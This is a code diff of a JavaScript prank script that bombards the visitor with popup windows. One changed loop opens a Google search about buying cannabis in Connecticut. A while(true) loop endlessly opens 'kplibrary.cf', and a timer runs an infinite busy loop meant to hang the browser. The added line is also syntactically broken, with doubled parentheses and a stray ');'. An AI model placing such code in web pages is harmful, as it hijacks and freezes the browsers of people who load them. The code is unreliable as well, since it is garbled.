@@ -5,12 +5,11 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
-  for (var i = 0; i < 70; i++) {
-    window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
+  for (var i = 0; i < 4; i++) {
+    window.open(('https://www.google.com/search?q=how+to+buy+weed+in+connecticut&oq=how+to+buy+weed+in+connecticut&aqs=chrome..69i57j0l5.7351j0j7&sourceid=chrome&ie=UTF-8', '_blank', 'toolbar=0,location=0,menubar=0'););
   }
   while (true) {
     window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-    window.open('https://www.google.com/search?q=how+to+buy+weed+in+connecticut&oq=how+to+buy+weed+in+connecticut&aqs=chrome..69i57j0l5.7351j0j7&sourceid=chrome&ie=UTF-8', '_blank', 'toolbar=0,location=0,menubar=0');
     setTimeout(function() {
       for (var i = 0; i === i; i++) {}
     }, 50);
